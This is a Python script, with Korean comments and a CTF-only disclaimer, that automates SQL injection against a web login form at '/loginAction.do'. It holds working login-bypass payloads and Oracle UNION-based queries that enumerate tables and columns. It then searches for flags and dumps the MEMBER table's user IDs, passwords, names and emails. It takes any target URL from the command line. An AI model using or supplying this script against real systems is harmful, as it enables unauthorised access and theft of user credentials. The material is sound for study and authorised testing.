#!/usr/bin/env python3
"""
SQL Injection 자동화 스크립트
CTF 대회용 - 승인된 환경에서만 사용하세요!
"""

import requests
import sys
from urllib.parse import urljoin

class SQLInjectionAttacker:
    def __init__(self, base_url):
        self.base_url = base_url
        self.login_url = urljoin(base_url, "/loginAction.do")
        self.session = requests.Session()
    
    def test_basic_bypass(self):
        """기본 SQL Injection 로그인 우회 테스트"""
        print("[*] Testing basic SQL injection bypass...")
        
        payloads = [
            ("admin' OR '1'='1' --", "anything"),
            ("admin' OR 1=1 --", "anything"),
            ("' OR '1'='1", "' OR '1'='1"),
            ("admin'--", "anything"),
            ("admin' #", "anything"),
        ]
        
        for username, password in payloads:
            print(f"[+] Trying: {username} / {password}")
            
            data = {
                "MEMBER_ID": username,
                "MEMBER_PASSWD": password
            }
            
            response = self.session.post(self.login_url, data=data, allow_redirects=False)
            
            if response.status_code == 302 or "main.do" in response.text:
                print(f"[SUCCESS] Login bypassed with: {username}")
                return True
            elif "일치하지 않습니다" not in response.text:
                print(f"[POSSIBLE] Unusual response for: {username}")
        
        print("[-] Basic bypass failed")
        return False
    
    def extract_tables(self):
        """UNION 기반 테이블 목록 추출"""
        print("\n[*] Attempting to extract table names...")
        
        # Oracle UNION 페이로드
        payload = "' UNION SELECT TABLE_NAME,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM USER_TABLES --"
        
        data = {
            "MEMBER_ID": payload,
            "MEMBER_PASSWD": "anything"
        }
        
        response = self.session.post(self.login_url, data=data)
        
        # 테이블 이름 패턴 찾기
        import re
        tables = re.findall(r'[A-Z_]{3,}', response.text)
        
        if tables:
            print("[+] Found tables:")
            for table in set(tables):
                print(f"    - {table}")
            return list(set(tables))
        else:
            print("[-] No tables found")
            return []
    
    def extract_columns(self, table_name):
        """특정 테이블의 컬럼 추출"""
        print(f"\n[*] Extracting columns from {table_name}...")
        
        payload = f"' UNION SELECT COLUMN_NAME,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM USER_TAB_COLUMNS WHERE TABLE_NAME='{table_name}' --"
        
        data = {
            "MEMBER_ID": payload,
            "MEMBER_PASSWD": "anything"
        }
        
        response = self.session.post(self.login_url, data=data)
        
        import re
        columns = re.findall(r'[A-Z_]{3,}', response.text)
        
        if columns:
            print(f"[+] Columns in {table_name}:")
            for col in set(columns):
                print(f"    - {col}")
            return list(set(columns))
        else:
            print(f"[-] No columns found in {table_name}")
            return []
    
    def search_flag(self):
        """플래그 검색"""
        print("\n[*] Searching for flags...")
        
        # 플래그가 있을 만한 테이블 이름
        flag_tables = ["SECRET_FLAGS", "FLAGS", "SECRETS", "HIDDEN", "CTF_FLAGS"]
        
        for table in flag_tables:
            payload = f"' UNION SELECT FLAG,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM {table} --"
            
            data = {
                "MEMBER_ID": payload,
                "MEMBER_PASSWD": "anything"
            }
            
            try:
                response = self.session.post(self.login_url, data=data, timeout=5)
                
                if "FLAG{" in response.text:
                    import re
                    flags = re.findall(r'FLAG\{[^}]+\}', response.text)
                    if flags:
                        print(f"[SUCCESS] Found flag in {table}:")
                        for flag in flags:
                            print(f"    {flag}")
                        return flags
            except:
                pass
        
        print("[-] No flags found in common tables")
        return []
    
    def dump_users(self):
        """사용자 정보 덤프"""
        print("\n[*] Dumping user credentials...")
        
        payload = "' UNION SELECT MEMBER_ID,MEMBER_PASSWD,MEMBER_NAME,MEMBER_EMAIL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM MEMBER --"
        
        data = {
            "MEMBER_ID": payload,
            "MEMBER_PASSWD": "anything"
        }
        
        response = self.session.post(self.login_url, data=data)
        
        if "MEMBER" in response.text or "@" in response.text:
            print("[+] User data extracted (check response)")
            # 실제로는 파싱해서 출력
            return True
        else:
            print("[-] Failed to dump users")
            return False

def main():
    if len(sys.argv) < 2:
        print("Usage: python sql_injection.py <target_url>")
        print("Example: python sql_injection.py http://localhost:8080")
        sys.exit(1)
    
    target = sys.argv[1]
    
    print("=" * 60)
    print("SQL Injection Attack Script")
    print("Target:", target)
    print("=" * 60)
    
    attacker = SQLInjectionAttacker(target)
    
    # 1. 기본 우회 시도
    if attacker.test_basic_bypass():
        print("\n[+] Successfully bypassed authentication!")
    
    # 2. 테이블 추출
    tables = attacker.extract_tables()
    
    # 3. MEMBER 테이블 컬럼 추출
    if "MEMBER" in tables:
        attacker.extract_columns("MEMBER")
    
    # 4. 플래그 검색
    flags = attacker.search_flag()
    
    # 5. 사용자 정보 덤프
    attacker.dump_users()
    
    print("\n" + "=" * 60)
    print("Attack completed!")
    print("=" * 60)

if __name__ == "__main__":
    main()
